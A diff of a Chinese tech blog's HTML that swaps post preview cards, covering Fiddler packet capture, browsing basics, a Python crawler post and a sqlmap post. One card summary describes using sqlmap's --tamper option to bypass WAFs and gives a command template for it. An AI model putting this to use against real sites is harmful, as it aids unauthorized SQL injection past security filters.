-                            说起抓包，很多人以为就是用个工具，简简单单地抓一下就可以了。
-在这里，我必须发一个教程，解析一下抓包神器——Fiddler。
-Fiddler仅仅是一个抓包工具？不好意思，Fiddler用得好，真的可以为所欲为。
-Fiddler的作者
+                            一、浏览网页的基本过程和通信基础
+当我们在浏览器地址栏输入： http://www.baidu.com 回车后会浏览器显示百度的首页，那这 段网络通信过程中到底发生了什么？
 
-Fi
+简单来说这段过程发生了以下四个步骤：
+
+浏览器通过DNS服务器查
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-02
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-11
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/fiddler/" class="post-category" target="_blank">
-                                    fiddler
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/fiddler/" target="_blank">
-                        <span class="chip bg-color">fiddler</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/05/18/python-crawler-static-sample-6/">
-                    <div class="card-image">
-                        
-                        <img src="/source/images/xxx.jpg" class="responsive-img" alt="Python网络爬虫实战之六：静态网页爬取案例实战">
-                        
-                        <span class="card-title">Python网络爬虫实战之六：静态网页爬取案例实战</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-正文：预备知识点：正则表达式之 pattern+?、pattern*?、(?!pattern)、(?:pattern)pattern+?、pattern*?这两个比较常用，表示懒惰匹配，即匹配符合条件的尽量短的字符串。默认情况下 + 和 
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-18
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -794,6 +609,56 @@ Fi
                     
                     <a href="/tags/Python/" target="_blank">
                         <span class="chip bg-color">Python</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/04/01/sqlmap-tamper/">
+                    <div class="card-image">
+                        
+                        <img src="/source/images/xxx.jpg" class="responsive-img" alt="sqlmap使用记录--tamper">
+                        
+                        <span class="card-title">sqlmap使用记录--tamper</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。
+0x01 命令如下1  sqlmap -u [url] --tamper [模块名]
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/sqlmap/" class="post-category" target="_blank">
+                                    sqlmap
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqlmap/" target="_blank">
+                        <span class="chip bg-color">sqlmap</span>
                     </a>
                     
                 </div>
